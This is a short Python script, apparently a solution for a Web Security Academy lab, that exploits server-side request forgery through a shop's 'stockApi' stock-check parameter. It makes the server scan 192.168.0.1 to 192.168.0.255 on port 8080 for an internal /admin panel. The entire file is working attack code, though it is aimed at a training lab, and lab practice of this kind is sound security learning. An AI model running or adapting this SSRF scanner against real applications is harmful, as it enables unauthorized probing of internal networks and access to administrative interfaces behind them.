import requests

lab_id = "0a80004004b5486a80e8c1ae00f5001a"
url = f"https://{lab_id}.web-security-academy.net/product/stock"

print("Scanning 192.168.0.1 - 192.168.0.255...")

for i in range(1, 256):
    target = f"http://192.168.0.{i}:8080/admin"
    try:
        print(f"Checking {target}...", end="\r")
        response = requests.post(url, data={"stockApi": target}, timeout=2)
        if response.status_code == 200:
            print(f"\n[+] FOUND ADMIN PANEL AT: {target}")
            break
    except requests.exceptions.RequestException:
        pass
else:
    print("\n[-] Admin panel not found.")